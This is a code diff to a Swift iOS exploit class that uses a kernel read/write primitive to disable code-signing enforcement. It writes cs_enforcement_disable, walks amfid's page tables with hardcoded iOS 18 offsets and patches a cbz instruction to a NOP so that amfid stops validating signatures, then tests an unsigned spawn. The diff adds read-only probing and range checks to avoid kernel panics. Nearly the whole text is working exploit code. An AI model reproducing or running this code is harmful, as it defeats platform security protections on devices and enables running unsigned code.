@@ -143,17 +143,15 @@ final class ExpAmfidNopFinal {
         out("[3/7] Setting kernel enforcement flags...")
         let slide = ds_get_kernel_slide()
         
-        // cs_enforcement_disable = 1
+        // cs_enforcement_disable = 1 (proven safe)
         ds_kwrite32(0xfffffff00a160798 &+ slide, 1)
         let csVal = ds_kread32(0xfffffff00a160798 &+ slide)
         out("cs_enforcement_disable = \(csVal) \(csVal == 1 ? "✅" : "❌")")
         
-        // Zero AMFI enforcement flags
-        let amfiBase: UInt64 = 0xfffffff00a330098 &+ slide
-        for off: UInt64 in [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408] {
-            ds_kwrite64(amfiBase &+ off, 0)
-        }
-        out("AMFI 10 flags zeroed ✅")
+        // SKIP AMFI flag zeroing for now — isolating respring cause
+        // The AMFI flags were proven writable before but may not be needed
+        // for the amfid NOP approach (NOP bypasses ALL validation)
+        out("AMFI flags: skipped (not needed for NOP approach)")
         out("")
         
         // ─── Step 4-7: task_for_pid + patch via launchd ───
@@ -172,10 +170,77 @@ final class ExpAmfidNopFinal {
     
     #if !DISABLE_REMOTECALL
     private func performPatchViaSB(amfidPid: Int32, amfidProc: UInt64) {
-        // NOTE: SpringBoard does NOT have task_for_pid-allow entitlement!
-        // Calling task_for_pid from SB causes exception → respring.
-        // Go directly to kernel path (pure KRW, no RC needed).
-        log("[4/7] Using kernel direct path (safe, no RC needed)...")
+        // SAFE MODE: Only READ kernel memory, NO writes
+        // This lets us see what values we get before any crash
+        log("[4/7] Kernel read-only probe (NO writes)...")
+        log("")
+        
+        let amfidTask = taskbyproc(amfidProc)
+        log("  amfid task: 0x\(String(format:"%llx", amfidTask))")
+        
+        guard amfidTask != 0 && amfidTask > 0xfffffff000000000 else {
+            log("❌ taskbyproc returned invalid value")
+            log("   Falling back to launchd...")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // Read vm_map
+        let vmMap = ds_kread64(amfidTask + 0x28)
+        log("  vm_map (task+0x28): 0x\(String(format:"%llx", vmMap))")
+        
+        guard vmMap != 0 && vmMap > 0xfffffff000000000 else {
+            log("❌ vm_map invalid — offset may be wrong")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // Read pmap
+        let pmap = ds_kread64(vmMap + 0x48)
+        log("  pmap (vm_map+0x48): 0x\(String(format:"%llx", pmap))")
+        
+        guard pmap != 0 && pmap > 0xfffffff000000000 else {
+            log("❌ pmap invalid — offset 0x48 may be wrong")
+            log("   Trying other offsets...")
+            // Try common pmap offsets
+            for off: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x60] {
+                let val = ds_kread64(vmMap + off)
+                if val > 0xfffffff000000000 && val < 0xffffffffe0000000 {
+                    log("   vm_map+0x\(String(format:"%x", off)) = 0x\(String(format:"%llx", val)) ← possible pmap?")
+                }
+            }
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // Read ttep (pmap+0x0 is tte on most builds)
+        let ttep = ds_kread64(pmap + 0x0)
+        log("  ttep (pmap+0x0): 0x\(String(format:"%llx", ttep))")
+        
+        // Read text base
+        let textBase = ds_kread64(vmMap + 0x10)
+        log("  text base (vm_map+0x10): 0x\(String(format:"%llx", textBase))")
+        
+        // Validate all values before proceeding
+        let ttepValid = ttep > 0x800000000 && ttep < 0x900000000
+        let textValid = textBase >= 0x100000000 && textBase < 0x280000000000
+        
+        log("")
+        log("  Validation:")
+        log("    ttep in DRAM: \(ttepValid ? "✅" : "❌")")
+        log("    text in userspace: \(textValid ? "✅" : "❌")")
+        
+        guard ttepValid && textValid else {
+            log("")
+            log("❌ Cannot proceed — values invalid")
+            log("   Will NOT attempt page table walk (would crash)")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // NOW proceed with the actual patch
+        log("")
+        log("  All values valid — proceeding with page table walk...")
         patchViaKernelDirect(amfidProc: amfidProc, amfidPid: amfidPid)
     }
     
@@ -452,8 +517,8 @@ final class ExpAmfidNopFinal {
         
         // task → vm_map (offset 0x28 on iOS 18)
         let vmMap = ds_kread64(amfidTask + 0x28)
-        guard vmMap != 0 else {
-            log("❌ vm_map = 0")
+        guard vmMap != 0 && vmMap > 0xfffffff000000000 else {
+            log("❌ vm_map invalid: 0x\(String(format:"%llx", vmMap))")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
@@ -461,8 +526,9 @@ final class ExpAmfidNopFinal {
         
         // vm_map → pmap (offset 0x48 on iOS 18)
         let pmap = ds_kread64(vmMap + 0x48)
-        guard pmap != 0 else {
-            log("❌ pmap = 0")
+        guard pmap != 0 && pmap > 0xfffffff000000000 else {
+            log("❌ pmap invalid: 0x\(String(format:"%llx", pmap))")
+            log("   vm_map+0x48 may be wrong offset for this build")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
@@ -470,8 +536,10 @@ final class ExpAmfidNopFinal {
         
         // pmap → ttep (translation table entry pointer, offset 0x0)
         let ttep = ds_kread64(pmap + 0x0)
-        guard ttep != 0 else {
-            log("❌ ttep = 0")
+        guard ttep != 0 && ttep > 0x800000000 && ttep < 0x900000000 else {
+            log("❌ ttep out of DRAM range: 0x\(String(format:"%llx", ttep))")
+            log("   Expected physical address in 0x800000000-0x900000000")
+            log("   pmap+0x0 may not be ttep on this build")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
@@ -481,13 +549,6 @@ final class ExpAmfidNopFinal {
         let textBase = ds_kread64(vmMap + 0x10)
         guard textBase >= 0x100000000 && textBase < 0x280000000000 else {
             log("❌ text base invalid: 0x\(String(format:"%llx", textBase))")
-            log("   Trying first vm_map_entry...")
-            // Try first entry
-            let firstEntry = ds_kread64(vmMap + 0x8)
-            if firstEntry != 0 {
-                let entryStart = ds_kread64(firstEntry + 0x0)
-                log("   first entry start: 0x\(String(format:"%llx", entryStart))")
-            }
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
@@ -504,26 +565,46 @@ final class ExpAmfidNopFinal {
         
         log("  L1[\(l1Idx)] L2[\(l2Idx)] L3[\(l3Idx)] off=0x\(String(format:"%x", pageOff))")
         
-        // L1
-        let l1Entry = ds_kread64(ttep + l1Idx * 8)
+        // L1 — read from physical memory (ttep is physical)
+        let l1Addr = ttep + l1Idx * 8
+        guard l1Addr > 0x800000000 && l1Addr < 0x900000000 else {
+            log("❌ L1 addr out of range: 0x\(String(format:"%llx", l1Addr))")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        let l1Entry = ds_kread64(l1Addr)
         guard (l1Entry & 0x3) == 0x3 else {
             log("❌ L1 invalid: 0x\(String(format:"%llx", l1Entry))")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
         let l2Table = l1Entry & 0xFFFFFFFFF000
+        log("  L1 → L2 table: 0x\(String(format:"%llx", l2Table))")
         
         // L2
-        let l2Entry = ds_kread64(l2Table + l2Idx * 8)
+        let l2Addr = l2Table + l2Idx * 8
+        guard l2Addr > 0x800000000 && l2Addr < 0x900000000 else {
+            log("❌ L2 addr out of range: 0x\(String(format:"%llx", l2Addr))")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        let l2Entry = ds_kread64(l2Addr)
         guard (l2Entry & 0x3) == 0x3 else {
             log("❌ L2 invalid: 0x\(String(format:"%llx", l2Entry))")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
         let l3Table = l2Entry & 0xFFFFFFFFF000
+        log("  L2 → L3 table: 0x\(String(format:"%llx", l3Table))")
         
         // L3
-        let l3Entry = ds_kread64(l3Table + l3Idx * 8)
+        let l3Addr = l3Table + l3Idx * 8
+        guard l3Addr > 0x800000000 && l3Addr < 0x900000000 else {
+            log("❌ L3 addr out of range: 0x\(String(format:"%llx", l3Addr))")
+            fallbackToLaunchd(amfidPid: amfidPid)
+            return
+        }
+        let l3Entry = ds_kread64(l3Addr)
         guard (l3Entry & 0x3) != 0 else {
             log("❌ L3 invalid: 0x\(String(format:"%llx", l3Entry))")
             fallbackToLaunchd(amfidPid: amfidPid)
@@ -534,17 +615,15 @@ final class ExpAmfidNopFinal {
         
         log("  physical: 0x\(String(format:"%llx", physAddr))")
         
-        // SAFETY CHECK: verify physical address is reasonable
-        // On iPhone XR, DRAM starts at ~0x800000000
+        // SAFETY CHECK: verify physical address is in DRAM
         guard physAddr > 0x800000000 && physAddr < 0x900000000 else {
             log("❌ Physical address out of DRAM range!")
-            log("   Expected 0x800000000-0x900000000")
-            log("   This would cause panic — ABORTING")
+            log("   ABORTING — would cause panic")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
         
-        // Read current instruction
+        // Read current instruction at physical address
         let currentInsn = ds_kread32(physAddr)
         log("  current insn @ phys: 0x\(String(format:"%08x", currentInsn))")
         
@@ -554,13 +633,14 @@ final class ExpAmfidNopFinal {
                 testUnsignedSpawn()
                 return
             }
-            log("❌ NOT cbz at physical address")
-            log("   ASLR slide may differ — DO NOT write")
+            log("❌ NOT cbz at physical address: 0x\(String(format:"%08x", currentInsn))")
+            log("   Expected 0x34xxxxxx — ASLR slide may differ")
+            log("   DO NOT write — falling back to launchd")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
         
-        log("  ✅ confirmed cbz — writing NOP...")
+        log("  ✅ confirmed cbz w22 — writing NOP...")
         ds_kwrite32(physAddr, 0xD503201F)
         
         // Verify
